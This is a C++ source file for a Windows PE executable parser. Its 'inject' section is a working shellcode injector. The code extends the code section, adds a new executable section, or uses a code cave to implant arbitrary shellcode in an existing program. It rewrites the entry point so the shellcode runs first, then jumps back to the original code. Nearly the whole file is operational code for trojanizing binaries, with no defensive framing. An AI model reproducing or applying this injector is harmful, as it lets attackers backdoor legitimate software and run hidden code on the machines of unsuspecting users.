#include "parser.h"

IMAGE::IMAGE(const char *path) {
    if (path == NULL) {
        return;
    }

    this->pe_file = fopen(path, "rb");

    if (this->pe_file == NULL) {
        return;
    }

    this->current_offset = 0;

    fseek(this->pe_file, 0, SEEK_END);
    this->file_size = ftell(this->pe_file);
    fseek(this->pe_file, 0, SEEK_SET);

    this->dos_header = (IMAGE_DOS_HEADER *)malloc(sizeof(IMAGE_DOS_HEADER));
    this->file_header = (IMAGE_FILE_HEADER *)malloc(sizeof(IMAGE_FILE_HEADER));

    if (get_headers() == false) {
        destroy();
        return;
    } else if (get_sections() == false) {
        destroy();
        return;
    }
}

IMAGE::~IMAGE(void) {
    destroy();
}

void IMAGE::destroy(void) {
    if (this->file_header != NULL) {
        if (this->sections != NULL) {
            for (int i = 0; i < this->file_header->NumberOfSections; i++) {
                free(this->sections[i]);
            }

            free(this->sections);
        }

        if (is32() == true) {
            free(this->optional_header32);
        } else if (is64() == true) {
            free(this->optional_header64);
        }

        free(this->dos_header);
        free(this->file_header);
    }

    fclose(this->pe_file);
}

bool IMAGE::get_headers(void) {
    copy(this->dos_header, 0, sizeof(IMAGE_DOS_HEADER));

    this->magic = this->dos_header->e_magic;

    if (this->magic != IMAGE_DOS_SIGNATURE) {
        return false;
    } else if (read_dword(this->dos_header->e_lfanew) != IMAGE_NT_SIGNATURE) {
        return false;
    }

    copy(this->file_header, this->dos_header->e_lfanew + sizeof(uint32_t), sizeof(IMAGE_FILE_HEADER));

    if (this->file_header->Machine != IMAGE_FILE_MACHINE_I386 &&
        this->file_header->Machine != IMAGE_FILE_MACHINE_IA64 &&
        this->file_header->Machine != IMAGE_FILE_MACHINE_AMD64) {
        return false;
    }

    if (get_opt_headers() == false) {
        return false;
    }

    return true;
}

bool IMAGE::get_opt_headers(void) {
    uint32_t offset = this->dos_header->e_lfanew + sizeof(uint32_t) + sizeof(IMAGE_FILE_HEADER);

    this->magic = read_word(offset);

    if (is32() == true) {
        this->optional_header32 = (IMAGE_OPTIONAL_HEADER32 *)malloc(sizeof(IMAGE_OPTIONAL_HEADER32));
        copy(this->optional_header32, offset, sizeof(IMAGE_OPTIONAL_HEADER32));
    } else if (is64() == true) {
        this->optional_header64 = (IMAGE_OPTIONAL_HEADER64 *)malloc(sizeof(IMAGE_OPTIONAL_HEADER64));
        copy(this->optional_header64, offset, sizeof(IMAGE_OPTIONAL_HEADER64));
    } else {
        return false;
    }

    return true;
}

bool IMAGE::get_sections(void) {
    uint32_t offset = read_dword(offsetof(IMAGE_DOS_HEADER, e_lfanew));

    if (is32() == true) {
        offset += sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER32) + sizeof(uint32_t);
    } else if (is64() == true) {
        offset += sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER64) + sizeof(uint32_t);
    } else {
        return false;
    }

    this->sections = (IMAGE_SECTION_HEADER **)malloc(sizeof(IMAGE_SECTION_HEADER *) * this->file_header->NumberOfSections);

    for (int i = 0; i < this->file_header->NumberOfSections; i++) {
        this->sections[i] = (IMAGE_SECTION_HEADER *)calloc(1, sizeof(IMAGE_SECTION_HEADER));
        copy(this->sections[i], offset, sizeof(IMAGE_SECTION_HEADER));
        offset += sizeof(IMAGE_SECTION_HEADER);
    }

    return true;
}

IMAGE_SECTION_HEADER * IMAGE::get_section_by_name(char *section) {
    if (section == NULL || this->file_header == NULL) {
        return NULL;
    }

    for (int i = 0; i < this->file_header->NumberOfSections; i++) {
        if (strcmp((char *)this->sections[i]->Name, section) == 0) {
            return this->sections[i];
        }
    }

    return NULL;
}

IMAGE_SECTION_HEADER * IMAGE::get_section_by_offset(uint32_t offset) {
    if (this->sections == NULL) {
        return NULL;
    }

    uint64_t rVa = 0;
    uint64_t low = 0;
    uint64_t high = 0;

    for (int i = 0; i < this->file_header->NumberOfSections; i++) {
        low = this->sections[i]->VirtualAddress;
        high = low + this->sections[i]->SizeOfRawData;

        rVa = offset + this->sections[i]->VirtualAddress;
        rVa -= this->sections[i]->PointerToRawData;

        if (rVa < high && rVa >= low) {
            return this->sections[i];
        }
    }

    return NULL;
}

uint32_t IMAGE::addr_to_offset(uint64_t address) {
    if (this->sections == NULL) {
        return -1;
    }

    uint64_t imagebase = 0;
    uint64_t offset = 0;
    uint64_t low = 0;
    uint64_t high = 0;

    if (is32() == true) {
        imagebase = this->optional_header32->ImageBase;
    } else if (is64() == true) {
        imagebase = this->optional_header64->ImageBase;
    } else {
        return -1;
    }

    if ((address & imagebase) != imagebase) {
        address += imagebase;
    }

    for (int i = 0; i < this->file_header->NumberOfSections; i++) {
        low = this->sections[i]->VirtualAddress + imagebase;
        high = low + this->sections[i]->SizeOfRawData;

        if (address < high && address >= low) {
            offset = address - imagebase;
            offset -= this->sections[i]->VirtualAddress;
            offset += this->sections[i]->PointerToRawData;
            return offset;
        }
    }

    return -1;
}

uint64_t IMAGE::offset_to_addr(uint32_t offset) {
    if (this->sections == NULL) {
        return -1;
    }

    uint64_t rVa = 0;
    uint64_t low = 0;
    uint64_t high = 0;

    for (int i = 0; i < this->file_header->NumberOfSections; i++) {
        low = this->sections[i]->VirtualAddress;
        high = low + this->sections[i]->SizeOfRawData;

        rVa = offset + this->sections[i]->VirtualAddress;
        rVa -= this->sections[i]->PointerToRawData;

        if (rVa < high && rVa >= low) {
            return rVa;
        }
    }

    return -1;
}

bool IMAGE::is32(void) {
    if (this->magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        return true;
    }

    return false;
}

bool IMAGE::is64(void) {
    if (this->magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return true;
    }

    return false;
}

uint8_t IMAGE::read_byte(uint32_t offset) {
    set(offset);

    uint8_t buffer = 0;

    if (fread(&buffer, 1, sizeof(uint8_t), this->pe_file) != sizeof(uint8_t)) {
        return false;
    } else {
        this->current_offset += sizeof(uint8_t);
    }

    return buffer;
}

uint16_t IMAGE::read_word(uint32_t offset) {
    set(offset);

    uint16_t buffer = 0;

    if (fread(&buffer, 1, sizeof(uint16_t), this->pe_file) != sizeof(uint16_t)) {
        return false;
    } else {
        this->current_offset += sizeof(uint16_t);
    }

    return buffer;
}

uint32_t IMAGE::read_dword(uint32_t offset) {
    set(offset);

    uint32_t buffer = 0;

    if (fread(&buffer, 1, sizeof(uint32_t), this->pe_file) != sizeof(uint32_t)) {
        return false;
    } else {
        this->current_offset += sizeof(uint32_t);
    }

    return buffer;
}

uint64_t IMAGE::read_qword(uint32_t offset) {
    set(offset);

    uint64_t buffer = 0;

    if (fread(&buffer, 1, sizeof(uint64_t), this->pe_file) != sizeof(uint64_t)) {
        return false;
    } else {
        this->current_offset += sizeof(uint64_t);
    }

    return buffer;
}

bool IMAGE::copy(void *dst, uint32_t offset, uint32_t bytes) {
    set(offset);

    if (fread(dst, 1, bytes, this->pe_file) != bytes) {
        return false;
    } else {
        this->current_offset += bytes;
    }

    return true;
}

bool IMAGE::write(void *src, uint32_t offset, uint32_t bytes) {
    set(offset);

    if (fwrite(src, 1, bytes, this->pe_file) != bytes) {
        return false;
    } else {
        this->current_offset += bytes;
    }

    return true;
}

void IMAGE::set(uint32_t offset) {
    if (offset != this->current_offset) {
        fseek(this->pe_file, offset, SEEK_SET);
        this->current_offset = offset;
    }
}

////////////////////////////////////////////
//////////////// inject ////////////////////
////////////////////////////////////////////

uint32_t IMAGE::align(uint32_t value, uint32_t alignment) {
    return (value + alignment - 1) & ~(alignment - 1);
}

uint8_t * IMAGE::create_new_file(IMAGE_INJECT_INFO *info) {
    uint32_t curr_offset = 0;

    uint8_t *file = (uint8_t *)calloc(1, this->file_size + info->extention_size);

    memcpy(file, this->dos_header, sizeof(IMAGE_DOS_HEADER));
    *(uint16_t *)&file[curr_offset += this->dos_header->e_lfanew] = IMAGE_NT_SIGNATURE;
    memcpy(file + (curr_offset += sizeof(uint32_t)), this->file_header, sizeof(IMAGE_FILE_HEADER));

    if (is32() == true) {
        memcpy(file + (curr_offset += sizeof(IMAGE_FILE_HEADER)), this->optional_header32, sizeof(IMAGE_OPTIONAL_HEADER32));
        curr_offset += sizeof(IMAGE_OPTIONAL_HEADER32);
    } else if (is64() == true) {
        memcpy(file + (curr_offset += sizeof(IMAGE_FILE_HEADER)), this->optional_header64, sizeof(IMAGE_OPTIONAL_HEADER64));
        curr_offset += sizeof(IMAGE_OPTIONAL_HEADER64);
    }

    for (int i = 0; i < this->file_header->NumberOfSections; i++) {
        if (info->section != NULL && i == (this->file_header->NumberOfSections - 1)) {
            memcpy(file + curr_offset, info->section, sizeof(IMAGE_SECTION_HEADER));
            break;
        }

        uint32_t file_offset = this->sections[i]->PointerToRawData;
        uint32_t data_size = this->sections[i]->SizeOfRawData;
        uint8_t *data = (uint8_t *)malloc(data_size);

        copy(data, file_offset, data_size);

        if (info->is_extended == true) {
            if (i == (int)info->section_index) {
                data_size = info->original_size;
            } else if (i > (int)info->section_index) {
                this->sections[i]->PointerToRawData += info->extention_size;
                file_offset = this->sections[i]->PointerToRawData;
            }
        }

        memcpy(file + curr_offset, this->sections[i], sizeof(IMAGE_SECTION_HEADER));
        memcpy(file + file_offset, data, data_size);

        free(data);

        curr_offset += sizeof(IMAGE_SECTION_HEADER);
    }

    return file;
}

bool IMAGE::write_file(uint8_t *file, char *path, IMAGE_INJECT_INFO *info) {
    FILE *tmp = fopen(path, "wb");

    if (tmp == NULL) {
        return false;
    }

    fwrite(file, 1, this->file_size + info->extention_size, tmp);

    fclose(tmp);
    return true;
}

uint32_t IMAGE::update_entry_point(IMAGE_INJECT_INFO *info, uint32_t type) {
    if (info == NULL) {
        return 0;
    }

    if (is32() == true) {
        info->original_ep = this->optional_header32->AddressOfEntryPoint;

        if (type == NEW_SECTION) {
            this->optional_header32->AddressOfEntryPoint = info->section->VirtualAddress;
        } else {
            this->optional_header32->AddressOfEntryPoint = offset_to_addr(info->ptr_to_data);
        }
    } else if (is64() == true) {
        info->original_ep = this->optional_header64->AddressOfEntryPoint;

        if (type == NEW_SECTION) {
            this->optional_header64->AddressOfEntryPoint = info->section->VirtualAddress;
        } else {
            this->optional_header64->AddressOfEntryPoint = offset_to_addr(info->ptr_to_data);
        }
    } else {
        return 0;
    }

    if (type == NEW_SECTION) {
        return info->original_ep - (info->section->VirtualAddress + info->shellcode_size);
    } else {
        return info->original_ep - (offset_to_addr(info->ptr_to_data) + info->shellcode_size);
    }

    return 0;
}

bool IMAGE::extend_text_section(IMAGE_INJECT_INFO *info, uint32_t size) {
    IMAGE_SECTION_HEADER *text_section = NULL;

    for (int i = 0; i < this->file_header->NumberOfSections; i++) {
        if ((this->sections[i]->Characteristics & (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ)) > 0) {
            text_section = this->sections[i];
            info->section_index = i;
            break;
        }
    }

    if (text_section == NULL) {
        return false;
    }

    info->shellcode_size = size;
    info->original_size = text_section->Misc.VirtualSize;
    info->ptr_to_data = text_section->PointerToRawData + text_section->Misc.VirtualSize;

    uint32_t section_alignment = 0;
    uint32_t file_alignment = 0;

    if (is32() == true) {
        section_alignment = this->optional_header32->SectionAlignment;
        file_alignment = this->optional_header32->FileAlignment;
    } else if (is64() == true) {
        section_alignment = this->optional_header64->SectionAlignment;
        file_alignment = this->optional_header64->FileAlignment;
    } else {
        return false;
    }

    text_section->Misc.VirtualSize += size;
    text_section->SizeOfRawData = align(text_section->Misc.VirtualSize, file_alignment);
    info->extention_size = align(size, file_alignment);
    info->is_extended = true;

    if (this->file_header->NumberOfSections > (info->section_index + 1)) {
        uint32_t A = this->sections[info->section_index + 1]->VirtualAddress;
        uint32_t B = text_section->VirtualAddress + align(text_section->SizeOfRawData, section_alignment);

        if (B > A) {
            return false;
        }
    }

    return true;
}

bool IMAGE::append_new_section(IMAGE_INJECT_INFO *info, uint32_t size) {
    uint32_t section_alignment = 0;
    uint32_t file_alignment = 0;
    uint32_t size_of_headers = 0;

    if (is32() == true) {
        section_alignment = this->optional_header32->SectionAlignment;
        file_alignment = this->optional_header32->FileAlignment;
        this->optional_header32->SizeOfImage += align(size, section_alignment);
        size_of_headers = sizeof(IMAGE_OPTIONAL_HEADER32);
    } else if (is64() == true) {
        section_alignment = this->optional_header64->SectionAlignment;
        file_alignment = this->optional_header64->FileAlignment;
        this->optional_header64->SizeOfImage += align(size, section_alignment);
        size_of_headers = sizeof(IMAGE_OPTIONAL_HEADER64);
    } else {
        return false;
    }

    size_of_headers += this->dos_header->e_lfanew + sizeof(uint32_t) + sizeof(IMAGE_FILE_HEADER);

    uint32_t A = size_of_headers + sizeof(IMAGE_SECTION_HEADER) * this->file_header->NumberOfSections;
    uint32_t B = align(A, file_alignment);

    if ((A + sizeof(IMAGE_SECTION_HEADER)) > B) {
        return false;
    }

    info->section = (IMAGE_SECTION_HEADER *)calloc(1, sizeof(IMAGE_SECTION_HEADER));

    IMAGE_SECTION_HEADER *last_section = this->sections[this->file_header->NumberOfSections - 1];
    uint32_t virtual_total = last_section->VirtualAddress + last_section->SizeOfRawData;

    info->section->Misc.VirtualSize = size;
    info->section->VirtualAddress = align(virtual_total, section_alignment);
    info->section->SizeOfRawData = align(size, file_alignment);
    info->section->PointerToRawData = align(last_section->PointerToRawData + last_section->Misc.VirtualSize, file_alignment);
    info->section->Characteristics = (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ);

    info->shellcode_size = size;
    info->extention_size = info->section->SizeOfRawData;
    info->ptr_to_data = info->section->PointerToRawData;

    this->file_header->NumberOfSections += 1;

    return true;
}

bool IMAGE::find_code_cave(IMAGE_INJECT_INFO *info, uint32_t size) {
    uint8_t *file_copy = (uint8_t *)malloc(this->file_size);

    copy(file_copy, 0, this->file_size);

    int offset = 0;
    int max = 0;

    for (int i = 0; i < (int)this->file_size && max < (int)size; i++) {
        if (file_copy[i] != '\x00') {
            continue;
        }

        int j = i + 1;

        while (j < (int)this->file_size && file_copy[j] == '\x00') {
            j++;
        }

        if ((j - i) > max) {
            offset = i;
            max = j - i;
        }

        i = j;
    }

    free(file_copy);

    if (max < (int)size) {
        return false;
    }

    info->shellcode_size = size;
    info->ptr_to_data = offset;

    IMAGE_SECTION_HEADER *section = get_section_by_offset(offset);

    if (section != NULL) {
        section->Characteristics |= (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ);
    } else {
        return false;
    }

    return true;
}

bool IMAGE::inject(char *path, uint8_t *shellcode, uint32_t size, uint32_t type) {
    if (this->pe_file == NULL || this->file_header == NULL) {
        return false;
    } else if (path == NULL || shellcode == NULL) {
        return false;
    }

    IMAGE_INJECT_INFO *info = (IMAGE_INJECT_INFO *)calloc(1, sizeof(IMAGE_INJECT_INFO));

    uint8_t *file = NULL;
    uint8_t trampoline[] = {0xe9, 0, 0, 0, 0};
    bool inject_success = false;
    bool init_success = false;

    if (type == EXTEND_CODE) {
        init_success = extend_text_section(info, size + sizeof(trampoline));
    } else if (type == NEW_SECTION) {
        init_success = append_new_section(info, size + sizeof(trampoline));
    } else if (type == CODE_CAVE) {
        init_success = find_code_cave(info, size + sizeof(trampoline));
    } else {
        return false;
    }

    if (init_success == true) {
        uint32_t ret_addr = update_entry_point(info, type);

        if ((file = create_new_file(info)) != NULL) {
            *(uint32_t *)&trampoline[1] = ret_addr;
            memcpy(file + info->ptr_to_data, shellcode, size);
            memcpy(file + info->ptr_to_data + size, trampoline, sizeof(trampoline));
            inject_success = write_file(file, path, info);
            free(file);
        }
    }

    if (type == NEW_SECTION) {
        free(info->section);
    }
    free(info);

    return inject_success;
}
